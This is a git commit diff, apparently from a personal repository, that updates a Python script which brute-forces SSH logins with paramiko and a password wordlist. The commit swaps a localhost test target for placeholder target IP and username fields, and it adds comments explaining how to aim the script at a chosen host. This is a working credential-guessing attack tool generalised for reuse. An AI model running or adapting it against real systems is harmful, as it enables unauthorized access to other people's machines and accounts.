0c64fe5debb51884156a81e025e7a66aee00cfbb
Vukodlok <52221871+Vukodlok@users.noreply.github.com>
2024-04-16 13:05:09 -0400

    updated ssh brute force script
    Updated parameters to be more generic for general use.  Comment code added for clarity.

--- ssh login brute force script.py
+++ ssh login brute force script.py
@@ -1,11 +1,11 @@
 from pwn import *
 import paramiko
 
-host = "127.0.0.1"
-username = "notroot"
+host = "targetIP"
+username = "targetUser"
 attempts = 0
 
-with open("ssh-common-passwords.txt", "r") as password_list:
+with open("password_list.txt", "r") as password_list:
 	for password in password_list:
 		password = password.strip("\n")
 		try:
@@ -19,3 +19,7 @@ with open("ssh-common-passwords.txt", "r") as password_list:
 		except paramiko.ssh_exception.AuthenticationException:
 			print("[X] Invalid password!")
 		attempts += 1
+
+#change line4 host to target IP like 127.0.0.1
+#change line5 username to target username like "notroot"
+#change line8 file name to file containing common passwords like ssh-common-passwords.txt
